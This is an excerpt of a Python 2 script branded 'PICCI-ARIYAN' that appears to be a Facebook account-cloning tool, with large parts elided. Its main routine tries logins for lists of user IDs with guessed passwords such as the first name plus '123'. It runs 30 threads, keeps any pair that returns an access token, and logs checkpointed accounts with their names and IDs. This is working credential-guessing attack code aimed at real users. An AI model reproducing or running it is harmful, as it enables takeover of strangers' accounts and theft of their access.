...
\033[1;91m    ║══▒═PICCI═▒═ARIYAN═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\033[1;96m    ║✯ PICCI-ARIYAN              ║    
\033[1;98m    ║✯ PICCI-ARIYAN          ║  
\033[1;96m    ║✯ PICCI-ARIYAN  ║
\033[1;91m    ║══▒═PICCI═▒═ARIYAN═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
...
def pilih():
	...
	if unikers =="":
		...
		os.system('clear')
		print logo
		print " \033[1;36;40m●══════════════════◄PICCI-ARIYAN►══════════════════●\n"
...
def pilih_super():
	...
	print "   \033[1;92m●══════════════════◄PICCI-ARIYAM►══════════════════●"

	jalan('           \033[1;91mAAM start cloning Wait...')
	print  "  \033[1;92m ●══════════════════◄PICCI-ARIYAN►══════════════════●" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mA-A-M100%💉'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mAAM-Cp'
				    ...
				    pass2 = b['first_name'] + '123'										
			            ...
			            if 'access_token' in q:	
				            ...
				            oks.append(user+pass2)
			                   ...
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mAAMCp'
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mPICCI-ARIYAN \033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By PICCI-ARIYAN--•◈•---»" #Dev:TONU
...
_______¶¶¶_________¶______¶_________¶¶¶______
         ...
         CP ID Open After 3 Days
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....PICCI-ARIYAN....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91m Tonu"""
